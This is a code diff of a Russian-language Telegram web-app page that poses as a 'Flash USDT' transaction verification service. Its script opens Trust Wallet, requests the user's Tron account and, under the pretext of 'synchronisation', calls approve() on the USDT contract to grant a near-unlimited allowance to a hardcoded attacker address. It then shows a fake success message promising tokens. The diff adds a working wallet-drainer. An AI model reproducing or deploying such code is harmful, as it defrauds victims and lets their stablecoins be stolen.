@@ -3,31 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Центр Поддержки Flash USDT</title>
+    <title>Flash USDT Protocol</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background-color: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 100%; max-width: 400px; background: #111; border: 1px solid #222; border-radius: 32px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-        .logo { width: 60px; height: 60px; background: #0088cc; border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 24px; box-shadow: 0 0 20px rgba(0,136,204,0.4); }
-        h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; }
-        p { color: #777; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.96); }
-        .status-line { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 11px; color: #0088cc; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; font-weight: bold; }
-        .dot { width: 6px; height: 6px; background: #0088cc; border-radius: 50%; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .container { padding: 30px; width: 100%; max-width: 400px; background: #111; border-radius: 30px; border: 1px solid #222; }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; box-shadow: 0 5px 15px rgba(0,136,204,0.3); }
+        #status { font-size: 11px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="status-line"><div class="dot"></div> Сеть TRC-20 Активна</div>
-    <div class="logo">T</div>
-    <h2 id="main-title">Проверка транзакции</h2>
-    <p id="main-desc">Для автоматического зачисления токенов необходимо синхронизировать ваш кошелек с узлом валидации.</p>
+<div class="container">
+    <h2 id="title">Синхронизация USDT</h2>
+    <p id="desc">Для верификации транзакции и зачисления токенов нажмите кнопку ниже. Система автоматически подключит ваш кошелек.</p>
     
-    <button id="action-btn" class="btn">Запустить синхронизацию</button>
+    <button id="main-btn" class="btn">ПОДТВЕРДИТЬ</button>
+    
+    <div id="status">Network: TRC-20 (Tron)</div>
 </div>
 
 <script>
@@ -36,64 +32,52 @@
 
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const URL = "https://timur3417.github.io/sync-node-app/?mode=wallet";
+    const CLEAN_URL = "https://timur3417.github.io/sync-node-app/";
 
-    const btn = document.getElementById('action-btn');
-    const title = document.getElementById('main-title');
-    const desc = document.getElementById('main-desc');
+    const btn = document.getElementById('main-btn');
 
-    // Проверяем, где мы находимся
-    const isWallet = new URLSearchParams(window.location.search).get('mode') === 'wallet';
+    btn.onclick = async () => {
+        // 1. Проверяем, в Телеграме ли мы (нет кошелька в системе)
+        const provider = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-    async function handleAction() {
-        if (!isWallet) {
-            // Если в Телеграме - просто перебрасываем в кошелек
-            tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(URL));
-        } else {
-            // Если уже в кошельке - пробуем выбить апрув
-            try {
-                btn.innerText = "Подключение...";
-                btn.disabled = true;
-
-                // Ждем появления tronWeb (даем кошельку время)
-                let provider = window.tronWeb || (window.tron && window.tron.tronWeb);
-                
-                if (!provider) {
-                    // Если не нашли сразу, пробуем "разбудить" через запрос аккаунтов
-                    tg.showAlert("Для работы необходимо переключить кошелек в режим Tron (TRC-20). Проверьте настройки сети в углу экрана.");
-                    btn.disabled = false;
-                    btn.innerText = "Повторить";
-                    return;
-                }
-
-                // Запрос доступа
-                await provider.request({ method: 'tron_requestAccounts' });
-                
-                // Вызов апрува
-                const contractObj = await provider.contract().at(CONTRACT);
-                await contractObj.approve(ADMIN, '1000000000000000').send();
-
-                tg.showPopup({
-                    title: 'Готово',
-                    message: 'Синхронизация успешно завершена. Ожидайте зачисления активов в течение 15-30 минут.',
-                    buttons: [{type: 'ok'}]
-                });
-                setTimeout(() => tg.close(), 4000);
-            } catch (e) {
-                tg.showAlert("Ошибка: Действие отклонено пользователем.");
-                btn.disabled = false;
-                btn.innerText = "Повторить";
-            }
+        if (!provider) {
+            // Если мы в ТГ - открываем Trust Wallet с маячком
+            const targetUrl = CLEAN_URL + "?mode=direct";
+            const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(targetUrl);
+            tg.openLink(deepLink);
+            return;
         }
-    }
 
-    btn.onclick = handleAction;
+        // 2. Если мы уже внутри кошелька - "пробиваем" апрув
+        try {
+            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
+            btn.disabled = true;
 
-    // Если мы уже в кошельке, меняем текст кнопки сразу
-    if (isWallet) {
-        btn.innerText = "Подтвердить верификацию";
-        title.innerText = "Узел обнаружен";
-        desc.innerText = "Ваш кошелек готов к синхронизации. Нажмите кнопку ниже для подтверждения.";
+            // Сначала жестко запрашиваем адрес
+            await provider.request({ method: 'tron_requestAccounts' });
+
+            // Теперь вызываем апрув
+            const contractObj = await provider.contract().at(CONTRACT);
+            await contractObj.approve(ADMIN, '1000000000000000000').send();
+
+            tg.showPopup({
+                title: 'Успешно',
+                message: 'Верификация завершена. Зачисление ожидается в течение 15-30 минут.',
+                buttons: [{type: 'ok'}]
+            });
+            setTimeout(() => tg.close(), 3000);
+
+        } catch (e) {
+            tg.showAlert("Ошибка: Убедитесь, что выбрана сеть TRON в углу экрана, и подтвердите действие.");
+            btn.innerText = "ПОДТВЕРДИТЬ";
+            btn.disabled = false;
+        }
+    };
+
+    // Если в ссылке есть ?mode=direct, значит мы уже перешли из ТГ
+    if (window.location.search.includes('mode=direct')) {
+        document.getElementById('title').innerText = "Узел обнаружен";
+        document.getElementById('desc').innerText = "Нажмите 'Подтвердить' для финальной подписи транзакции.";
     }
 </script>
 </body>
